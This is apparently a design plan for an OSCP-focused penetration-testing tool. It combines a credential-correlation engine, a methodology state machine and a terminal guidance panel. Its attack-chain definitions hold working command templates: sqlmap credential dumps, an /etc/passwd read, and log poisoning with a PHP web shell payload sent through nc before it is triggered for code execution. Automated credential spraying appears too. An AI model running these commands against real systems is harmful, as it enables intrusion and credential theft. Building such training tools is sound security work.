# CRACK Hybrid Intelligence Implementation Plan
## Event-Driven Intelligence + Methodology State Machine

### Executive Summary
This plan outlines the implementation of a hybrid intelligence system for CRACK that combines:
- **Method 1**: Event-driven correlation intelligence (reactive)
- **Method 2**: Methodology state machine (proactive)

The goal is to naturally guide users toward successful exploitation paths through intelligent task suggestions and methodology enforcement.

---

## System Architecture

```
┌─────────────────────────────────────────────────────┐
│                   TUI Interface                      │
│  ┌──────────────┐ ┌──────────────┐ ┌─────────────┐ │
│  │ Guidance     │ │ Task Queue   │ │ Findings    │ │
│  │ Panel        │ │ (Prioritized)│ │ Correlation │ │
│  └──────────────┘ └──────────────┘ └─────────────┘ │
└─────────────────────────────────────────────────────┘
                           ▲
        ┌──────────────────┴──────────────────┐
        │          Task Orchestrator          │
        │    (Merges M1 and M2 suggestions)   │
        └──────────┬────────────┬─────────────┘
                   │            │
     ┌─────────────▼──┐   ┌────▼──────────────┐
     │ Event-Driven   │   │  Methodology      │
     │ Intelligence   │◄──┤  State Machine    │
     │     (M1)       │   │      (M2)         │
     └─────────┬──────┘   └────┬──────────────┘
               │                │
     ┌─────────▼────────────────▼──────────────┐
     │           EventBus + Findings           │
     └──────────────────────────────────────────┘
```

---

## Core Components

### 1. Task Orchestrator
**Location**: `track/intelligence/task_orchestrator.py`

```python
from typing import Dict, List
from queue import PriorityQueue

class TaskOrchestrator:
    """Merges suggestions from both intelligence sources"""
    
    def __init__(self, intelligence, methodology):
        self.intelligence = intelligence  # Method 1
        self.methodology = methodology    # Method 2
        self.task_queue = PriorityQueue()
        self.task_history = []
    
    def calculate_task_priority(self, task: Dict) -> float:
        """Combine multiple factors into single priority score"""
        
        score = 0.0
        
        # Method 1 contributions (reactive)
        if task.get('source') == 'correlation':
            score += 5.0  # Cross-service opportunity
        if task.get('source') == 'finding_chain':
            score += 4.0  # Part of exploit chain
            
        # Method 2 contributions (proactive)
        if task.get('phase_alignment'):
            score += 3.0  # Aligns with current phase
        if task.get('in_attack_chain'):
            score += 6.0 * task.get('chain_progress', 0.5)
            
        # OSCP pattern matching (both methods)
        if task.get('matches_oscp_pattern'):
            score += task.get('oscp_likelihood', 0.5) * 10.0
            
        # Recency and context
        if task.get('fresh_finding'):
            score += 2.0  # Strike while hot
            
        # Avoid repetition
        if task.get('id') in self.task_history:
            score *= 0.3  # Heavily deprioritize
            
        return score
    
    def generate_next_tasks(self) -> List[Dict]:
        """Main task generation combining both methods"""
        
        all_tasks = []
        
        # Get suggestions from both systems
        methodology_tasks = self.methodology.get_phase_suggestions()
        correlation_tasks = self.intelligence.get_correlation_tasks()
        
        all_tasks.extend(methodology_tasks)
        all_tasks.extend(correlation_tasks)
        
        # Deduplicate and merge
        merged_tasks = self._merge_similar_tasks(all_tasks)
        
        # Apply unified priority scoring
        for task in merged_tasks:
            task['priority'] = self.calculate_task_priority(task)
        
        # Sort and return top suggestions
        sorted_tasks = sorted(merged_tasks, key=lambda x: x['priority'], reverse=True)
        return sorted_tasks[:10]
```

### 2. Correlation Intelligence Engine
**Location**: `track/intelligence/correlation_engine.py`

```python
from typing import Dict, List, Optional
from ..core.event_bus import EventBus

class CorrelationIntelligence:
    """Method 1: Reactive intelligence from events"""
    
    # Cross-service correlation patterns
    CORRELATION_PATTERNS = {
        'credential': ['ssh', 'ftp', 'smb', 'rdp', 'web_login', 'telnet'],
        'username': ['password_spray', 'brute_force'],
        'domain': ['dns_enum', 'vhost_scan', 'smb_enum'],
        'email': ['password_spray', 'phishing_vector'],
        'hash': ['crack_hash', 'pass_the_hash'],
        'api_key': ['api_endpoints', 'cloud_services'],
        'technology': ['version_exploits', 'default_creds']
    }
    
    def __init__(self, event_bus: EventBus, methodology_engine):
        self.event_bus = event_bus
        self.methodology = methodology_engine
        self.correlation_memory = {}
        self.success_patterns = []
        self._register_handlers()
    
    def _register_handlers(self):
        self.event_bus.subscribe('finding_added', self.on_finding_added)
        self.event_bus.subscribe('task_completed', self.on_task_completed)
        self.event_bus.subscribe('service_detected', self.on_service_detected)
    
    def on_finding_added(self, event):
        """Process new findings and generate correlated tasks"""
        finding = event['finding']
        suggestions = []
        
        # Cross-service correlation
        if finding.type == 'credential':
            suggestions.extend(self._generate_credential_spray(finding))
            
        # Check for attack chain triggers
        if chain := self._detect_chain_trigger(finding):
            self.methodology.activate_chain(chain)
            suggestions.append({
                'name': f'Started {chain} attack chain',
                'type': 'notification',
                'priority_boost': 10
            })
            
        # Technology-specific exploits
        if finding.type == 'technology':
            suggestions.extend(self._get_tech_exploits(finding))
            
        # Username pattern detection
        if finding.type == 'username':
            suggestions.extend(self._generate_username_variants(finding))
            
        return suggestions
    
    def _generate_credential_spray(self, cred_finding):
        """Generate intelligent credential reuse tasks"""
        tasks = []
        services = self.event_bus.emit('get_active_services')[0]
        
        for service in services:
            if self._service_accepts_auth(service):
                priority = self._calculate_spray_priority(service, cred_finding)
                
                tasks.append({
                    'id': f'spray-{cred_finding.id}-{service.port}',
                    'name': f'Try {cred_finding.data["username"]} on {service.name}:{service.port}',
                    'command': self._build_auth_command(service, cred_finding),
                    'source': 'correlation',
                    'priority_boost': priority,
                    'category': 'credential_reuse',
                    'auto_queue': priority > 7
                })
        
        return tasks
    
    def _detect_chain_trigger(self, finding) -> Optional[str]:
        """Identify if finding triggers an attack chain"""
        
        chain_triggers = {
            'sql_injection': 'sqli_to_shell',
            'file_inclusion': 'lfi_to_rce',
            'file_upload': 'upload_to_shell',
            'xxe_vulnerability': 'xxe_to_data_exfil',
            'deserialization': 'deser_to_rce',
            'command_injection': 'cmdi_to_shell'
        }
        
        for trigger, chain_name in chain_triggers.items():
            if trigger in finding.tags or trigger in finding.type.lower():
                return chain_name
        
        return None
```

### 3. Methodology State Machine
**Location**: `track/methodology/methodology_engine.py`

```python
from enum import Enum, auto
from typing import List, Dict, Optional
from .attack_chains import AttackChain

class Phase(Enum):
    RECONNAISSANCE = auto()
    SERVICE_ENUMERATION = auto()
    VULNERABILITY_DISCOVERY = auto()
    EXPLOITATION = auto()
    PRIVILEGE_ESCALATION = auto()
    LATERAL_MOVEMENT = auto()

class MethodologyEngine:
    """Method 2: Proactive methodology guidance"""
    
    # Phase transition requirements
    PHASE_REQUIREMENTS = {
        Phase.SERVICE_ENUMERATION: ['port_scan_complete'],
        Phase.VULNERABILITY_DISCOVERY: ['services_enumerated'],
        Phase.EXPLOITATION: ['vulnerabilities_identified'],
        Phase.PRIVILEGE_ESCALATION: ['initial_access'],
        Phase.LATERAL_MOVEMENT: ['elevated_privileges']
    }
    
    def __init__(self, target_profile):
        self.profile = target_profile
        self.current_phase = Phase.RECONNAISSANCE
        self.phase_progress = {phase: 0.0 for phase in Phase}
        self.active_chains = []
        self.completed_actions = set()
        self.quick_wins = self._load_quick_wins()
    
    def get_phase_suggestions(self) -> List[Dict]:
        """Generate tasks based on current methodology phase"""
        suggestions = []
        
        # Check phase prerequisites
        if not self._phase_requirements_met():
            suggestions.extend(self._get_missing_requirements())
            return suggestions
        
        # Priority 1: Active attack chains
        for chain in self.active_chains:
            if next_step := chain.get_next_step():
                suggestions.append({
                    'id': f'chain-{chain.name}-{next_step.id}',
                    'name': next_step.name,
                    'command': next_step.command,
                    'in_attack_chain': True,
                    'chain_name': chain.name,
                    'chain_progress': chain.get_progress(),
                    'phase_alignment': True
                })
        
        # Priority 2: Quick wins for current phase
        quick_wins = self._check_quick_wins()
        suggestions.extend(quick_wins)
        
        # Priority 3: Standard phase tasks
        phase_tasks = self._get_phase_tasks()
        suggestions.extend(phase_tasks)
        
        return suggestions
    
    def _check_quick_wins(self) -> List[Dict]:
        """Identify high-probability vulnerabilities"""
        tasks = []
        services = self.profile.get_services()
        
        # OSCP common vulnerabilities
        patterns = [
            ('apache', '2.4.49', 'cve-2021-41773'),  # Path traversal
            ('tomcat', 'default', 'tomcat-default-creds'),
            ('wordpress', None, 'wpscan-aggressive'),
            ('smb', 'anonymous', 'enum4linux-full'),
            ('ftp', 'anonymous', 'ftp-download-all')
        ]
        
        for service in services:
            for pattern_service, pattern_version, exploit_id in patterns:
                if self._matches_pattern(service, pattern_service, pattern_version):
                    tasks.append({
                        'id': f'quick-win-{exploit_id}-{service.port}',
                        'name': f'🎯 High-probability: {exploit_id} on {service.port}',
                        'command': self._get_exploit_command(exploit_id, service),
                        'matches_oscp_pattern': True,
                        'oscp_likelihood': 0.8,
                        'phase_alignment': True,
                        'auto_queue': True
                    })
        
        return tasks
    
    def activate_chain(self, chain_name: str):
        """Start an attack chain (called by Method 1)"""
        chain = AttackChain.load(chain_name)
        self.active_chains.append(chain)
        
        # Transition to appropriate phase
        if chain.required_phase:
            self.transition_to(chain.required_phase)
    
    def transition_to(self, new_phase: Phase):
        """Safely transition between methodology phases"""
        if self._can_transition_to(new_phase):
            self.current_phase = new_phase
            self.event_bus.emit('phase_changed', {'phase': new_phase})
```

### 4. Attack Chain Definitions
**Location**: `track/methodology/attack_chains.py`

```python
from typing import Dict, List, Optional
from dataclasses import dataclass

@dataclass
class ChainStep:
    id: str
    name: str
    command: str
    success_indicators: List[str]
    failure_indicators: List[str]
    enables: Optional[str] = None
    timeout: int = 300

class AttackChain:
    """Multi-step attack sequences"""
    
    # OSCP-relevant attack chains
    CHAINS = {
        'sqli_to_shell': {
            'name': 'SQL Injection to Shell',
            'required_phase': 'EXPLOITATION',
            'steps': [
                ChainStep(
                    id='detect_sqli',
                    name='Confirm SQL injection',
                    command="sqlmap -u '{url}' --batch --level=2 --risk=2",
                    success_indicators=['vulnerable', 'injectable'],
                    failure_indicators=['not injectable'],
                    enables='enumerate_db'
                ),
                ChainStep(
                    id='enumerate_db',
                    name='Enumerate database',
                    command="sqlmap -u '{url}' --batch --dbs",
                    success_indicators=['available databases'],
                    failure_indicators=['unable to retrieve'],
                    enables='dump_users'
                ),
                ChainStep(
                    id='dump_users',
                    name='Extract credentials',
                    command="sqlmap -u '{url}' --batch --dump -T users",
                    success_indicators=['username', 'password'],
                    failure_indicators=['table not found'],
                    enables='try_credentials'
                ),
                ChainStep(
                    id='try_credentials',
                    name='Attempt authentication',
                    command='# Dynamic - will be filled by correlation engine',
                    success_indicators=['authenticated', 'logged in'],
                    failure_indicators=['denied', 'invalid'],
                    enables='establish_shell'
                )
            ]
        },
        
        'lfi_to_rce': {
            'name': 'Local File Inclusion to RCE',
            'required_phase': 'EXPLOITATION',
            'steps': [
                ChainStep(
                    id='verify_lfi',
                    name='Verify LFI vulnerability',
                    command="curl '{url}?file=../../../../etc/passwd'",
                    success_indicators=['root:x:0:0'],
                    failure_indicators=['not found', '404'],
                    enables='identify_vector'
                ),
                ChainStep(
                    id='identify_vector',
                    name='Find RCE vector',
                    command="# Check logs, proc/self/environ, php filters",
                    success_indicators=['apache', 'nginx', 'environ'],
                    failure_indicators=['permission denied'],
                    enables='poison_logs'
                ),
                ChainStep(
                    id='poison_logs',
                    name='Poison log files',
                    command='echo "<?php system($_GET[\'cmd\']); ?>" | nc {target} 80',
                    success_indicators=['connection'],
                    failure_indicators=['refused'],
                    enables='trigger_rce'
                ),
                ChainStep(
                    id='trigger_rce',
                    name='Trigger code execution',
                    command="curl '{url}?file=/var/log/apache2/access.log&cmd=id'",
                    success_indicators=['uid=', 'www-data'],
                    failure_indicators=['error', 'failed'],
                    enables='get_shell'
                )
            ]
        }
    }
    
    def __init__(self, chain_data: Dict):
        self.name = chain_data['name']
        self.required_phase = chain_data.get('required_phase')
        self.steps = chain_data['steps']
        self.current_step = 0
        self.completed_steps = []
    
    @classmethod
    def load(cls, chain_name: str):
        """Load a predefined attack chain"""
        if chain_name not in cls.CHAINS:
            raise ValueError(f"Unknown chain: {chain_name}")
        return cls(cls.CHAINS[chain_name])
    
    def get_next_step(self) -> Optional[ChainStep]:
        """Get the next step in the chain"""
        if self.current_step < len(self.steps):
            return self.steps[self.current_step]
        return None
    
    def get_progress(self) -> float:
        """Get chain completion percentage"""
        return self.current_step / len(self.steps) if self.steps else 0.0
```

---

## TUI Integration

### Guidance Panel
**Location**: `track/interactive/panels/guidance_panel.py`

```python
from typing import List, Dict
from ..themes import ThemeManager

class GuidancePanel:
    """Displays methodology and intelligence guidance"""
    
    def __init__(self, orchestrator, methodology, theme: ThemeManager):
        self.orchestrator = orchestrator
        self.methodology = methodology
        self.theme = theme
        self.display_mode = 'compact'  # compact/expanded
    
    def render(self, max_height: int = 10) -> List[str]:
        """Render guidance panel"""
        lines = []
        
        # Phase indicator
        phase_line = f"📍 Phase: {self.methodology.current_phase.name}"
        progress = self._get_phase_progress()
        lines.append(self.theme.header(f"{phase_line} [{progress}%]"))
        
        # Active attack chain
        if self.methodology.active_chains:
            chain = self.methodology.active_chains[0]
            chain_text = f"⚡ Active: {chain.name} (Step {chain.current_step}/{len(chain.steps)})"
            lines.append(self.theme.gold(chain_text))
            
            # Show current step
            if step := chain.get_next_step():
                lines.append(f"   └─ {step.name}")
        
        # Top recommendations
        lines.append(self.theme.header("🎯 Recommended Actions:"))
        tasks = self.orchestrator.generate_next_tasks()
        
        for i, task in enumerate(tasks[:3], 1):
            icon = self._get_task_icon(task)
            color = self._get_task_color_func(task)
            
            task_line = f"{i}. {icon} {task['name']}"
            lines.append(color(task_line))
            
            # Show reasoning (if expanded mode)
            if self.display_mode == 'expanded':
                reason = self._get_task_reasoning(task)
                lines.append(f"   └─ {reason}")
        
        # Quick actions
        lines.append("")
        lines.append(self.theme.dim("[g] Show full guidance | [m] Methodology view | [Tab] Next task"))
        
        return lines[:max_height]
    
    def _get_task_icon(self, task: Dict) -> str:
        """Get icon based on task type"""
        if task.get('in_attack_chain'):
            return '⚡'
        elif task.get('matches_oscp_pattern'):
            return '🎯'
        elif task.get('source') == 'correlation':
            return '🔄'
        elif task.get('priority', 0) > 8:
            return '🔥'
        else:
            return '▸'
    
    def _get_task_reasoning(self, task: Dict) -> str:
        """Explain why task is recommended"""
        if task.get('in_attack_chain'):
            return f"Part of {task['chain_name']} attack chain"
        elif task.get('source') == 'correlation':
            return "Cross-service opportunity detected"
        elif task.get('matches_oscp_pattern'):
            return f"Common OSCP vulnerability (confidence: {task.get('oscp_likelihood', 0.5):.0%})"
        elif task.get('phase_alignment'):
            return f"Critical for {self.methodology.current_phase.name} phase"
        else:
            return "Standard enumeration task"
```

---

## Implementation Timeline

### Week 1: Core Framework
- [ ] Create directory structure
- [ ] Implement TaskOrchestrator
- [ ] Implement CorrelationIntelligence base
- [ ] Implement MethodologyEngine base
- [ ] Create AttackChain class
- [ ] Write unit tests for each component

### Week 2: Intelligence Patterns
- [ ] Define correlation patterns JSON
- [ ] Implement cross-service correlation
- [ ] Add OSCP quick-win detection
- [ ] Create attack chain definitions
- [ ] Implement chain trigger detection
- [ ] Add success pattern tracking

### Week 3: TUI Integration
- [ ] Create GuidancePanel
- [ ] Integrate with TUISessionV2
- [ ] Update task rendering with priorities
- [ ] Add keyboard shortcuts for guidance
- [ ] Implement task auto-queueing
- [ ] Add configuration system

### Week 4: Testing & Refinement
- [ ] Integration testing
- [ ] Create test fixtures
- [ ] Performance optimization
- [ ] Documentation
- [ ] User testing
- [ ] Bug fixes and polish

---

## Configuration

### User Configuration
**Location**: `~/.crack/config.json`

```json
{
    "intelligence": {
        "enabled": true,
        "correlation": {
            "enabled": true,
            "aggressiveness": "medium",
            "auto_queue_tasks": false,
            "patterns_file": "~/.crack/correlation_patterns.json"
        },
        "methodology": {
            "enabled": true,
            "enforcement": "suggest",
            "show_reasoning": true,
            "phase_transitions": "manual",
            "custom_chains": "~/.crack/custom_chains.json"
        },
        "prioritization": {
            "correlation_weight": 0.4,
            "methodology_weight": 0.6,
            "oscp_pattern_boost": 2.0,
            "fresh_finding_boost": 1.5,
            "chain_progress_multiplier": 3.0
        },
        "ui": {
            "show_guidance_panel": true,
            "guidance_position": "top",
            "max_suggestions": 5,
            "show_confidence_scores": true
        }
    }
}
```

---

## Testing Strategy

### Unit Tests
```python
# tests/test_intelligence.py
def test_correlation_engine_credential_spray():
    """Test credential correlation generates appropriate tasks"""
    engine = CorrelationIntelligence(mock_event_bus, mock_methodology)
    
    # Add credential finding
    finding = Finding(type='credential', data={'username': 'admin', 'password': 'pass123'})
    tasks = engine.on_finding_added({'finding': finding})
    
    # Should generate tasks for each auth-capable service
    assert len(tasks) > 0
    assert all('Try admin on' in task['name'] for task in tasks)
    assert all(task['source'] == 'correlation' for task in tasks)

def test_methodology_phase_progression():
    """Test methodology enforces proper phase transitions"""
    methodology = MethodologyEngine(mock_profile)
    
    # Should start in RECONNAISSANCE
    assert methodology.current_phase == Phase.RECONNAISSANCE
    
    # Cannot jump to EXPLOITATION
    assert not methodology.transition_to(Phase.EXPLOITATION)
    
    # Can transition to SERVICE_ENUMERATION after recon
    methodology.mark_complete('port_scan_complete')
    assert methodology.transition_to(Phase.SERVICE_ENUMERATION)
```

### Integration Tests
```python
# tests/test_orchestration.py
def test_orchestrator_prioritization():
    """Test task priority calculation combines both methods"""
    orchestrator = TaskOrchestrator(mock_intelligence, mock_methodology)
    
    # Create tasks from different sources
    correlation_task = {'source': 'correlation', 'name': 'Correlation task'}
    chain_task = {'in_attack_chain': True, 'chain_progress': 0.5, 'name': 'Chain task'}
    phase_task = {'phase_alignment': True, 'name': 'Phase task'}
    
    # Chain task should have highest priority
    priorities = [
        orchestrator.calculate_task_priority(correlation_task),
        orchestrator.calculate_task_priority(chain_task),
        orchestrator.calculate_task_priority(phase_task)
    ]
    
    assert priorities[1] > priorities[0]  # Chain > Correlation
    assert priorities[1] > priorities[2]  # Chain > Phase
```

---

## Success Metrics

### Quantitative
- **Task Success Rate**: % of suggested tasks that lead to findings
- **Chain Completion Rate**: % of started chains that reach completion
- **Time to First Finding**: Reduced by 30%
- **False Positive Rate**: < 20% for high-priority suggestions

### Qualitative
- **User Feedback**: "The tool guides me naturally"
- **Learning Curve**: New users successful within 1 hour
- **OSCP Relevance**: Covers 80% of common OSCP patterns
- **Flexibility**: Power users can override/customize

---

## Future Enhancements

### Phase 2 Features
1. **Machine Learning Integration**
   - Learn from successful patterns
   - Adapt to user preferences
   - Predict likely vulnerabilities

2. **Collaborative Intelligence**
   - Share successful patterns (anonymized)
   - Community-driven chain definitions
   - Crowd-sourced OSCP patterns

3. **Advanced Correlation**
   - Multi-hop correlation
   - Temporal correlation
   - Service fingerprint matching

4. **Reporting Integration**
   - Auto-document methodology
   - Generate attack narratives
   - Create reproduction steps

---

## Notes

### Design Principles
- **Non-intrusive**: Suggestions, not requirements
- **Educational**: Always explain reasoning
- **Flexible**: Multiple configuration levels
- **Performance**: < 100ms for suggestions
- **Testable**: Clear separation of concerns

### OSCP Focus
- Prioritize manual techniques
- Explain tool alternatives
- Track time estimates
- Focus on common patterns
- Support exam methodology